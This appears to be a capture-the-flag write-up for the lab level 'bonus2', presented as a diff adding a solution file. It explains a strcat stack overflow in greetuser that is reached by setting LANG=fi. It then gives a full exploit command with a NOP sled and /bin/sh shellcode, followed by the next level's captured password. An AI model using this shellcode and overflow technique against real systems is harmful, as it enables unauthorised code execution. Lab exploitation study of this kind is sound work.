@@ -1,0 +1,33 @@
+solution bonus2:
+
+-> the main holds a buffer of 72 bytes, which we'll call "buff", and a pointer to char which we'll call "lang"
+
+-> the program leaves if we do not provide 2 arguments
+
+-> all the bytes of "buff" are set to 0 before two calls to strncpy are made :
+* the first one copies at most 40 bytes from argv[1] to "buff"
+* the second one copies at most 32 bytes from argv[2] to "buff" + 40
+
+-> next the result of the call to getenv("LANG") is stored in "lang"
+
+-> the program then calls the function "greetuser", which allocates space on the stack to hold a 72 bytes buffer which we'll call "str"
+
+-> this function works as follows:
+* if the first 2 bytes of the "LANG" environment variable are "fi", a string of 18 bytes is copied into "str"
+* else if the first 2 bytes are "nl", a string of 13 bytes is copied into "str"
+* else if "LANG" exists, a string of 6 bytes is copied into "str"
+* finally the program appends "buff" to "str" with strcat and displays "str" with puts
+
+-> since "buff" can go up to 72 bytes, it is possible to overflow "str" with the strcat method and reach the return address of greetuser stored on the stack
+to achieve this, we have to write into str[76] (72 bytes + saved ebp (4 bytes))
+
+-> we are going to set "LANG" to "fi", so that "str" contains 18 bytes already, which means we only have to add 58 bytes to reach the return address
+
+-> the first 40 bytes of "buff" copied from argv[1] will contain a NOP sled and a shellcode, while the 22 bytes copied from argv[2] will contain the address of redirection, which will point to somewhere inside the NOP sled
+(the stack in the main usually starts higher outside of gdb because gdb's arguments and environment are bigger)
+when LANG is set to "fi", and argv[1] is 40 bytes, and argv[2] is 22 bytes, main's esp is 0xbfffe600
+we have a pool of 15 NOP at the start of our buffer, (the shellcode is 25 bytes) so we will point to main's esp plus 14 bytes : 0xbfffe60e
+
+> LANG=fi ./bonus2 `python -c "print('\x90' * 15 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')"` `python -c "print('B' * 18 + '\x0e\xf6\xff\xbf')"`
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
